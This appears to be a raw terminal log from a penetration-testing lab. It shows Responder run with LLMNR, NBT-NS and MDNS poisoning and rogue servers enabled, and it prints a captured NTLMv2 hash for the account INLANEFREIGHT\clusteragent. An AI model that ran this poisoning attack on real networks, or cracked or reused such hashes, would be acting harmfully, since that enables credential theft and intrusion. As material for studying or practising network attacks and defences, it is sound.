```$sudo responder -I ens224 -wrvf
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-CP6IRWVEH2E]
    Responder Domain Name      [RMBJ.LOCAL]
    Responder DCE-RPC Port     [47133]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
[SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:12a7396eb23521a7:04D9DBC0FFB4A30FADA8F7408F4A7BCD:010100000000000080637FE0B676D80153B9ED478A742927000000000200080052004D0042004A0001001E00570049004E002D004300500036004900520057005600450048003200450004003400570049004E002D00430050003600490052005700560045004800320045002E0052004D0042004A002E004C004F00430041004C000300140052004D0042004A002E004C004F00430041004C000500140052004D0042004A002E004C004F00430041004C000700080080637FE0B676D80106000400020000000800300030000000000000000000000000300000D93A641F3F055547ECFF321F930B54E3F67E450C14D7516F602A6881C696C8C00A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000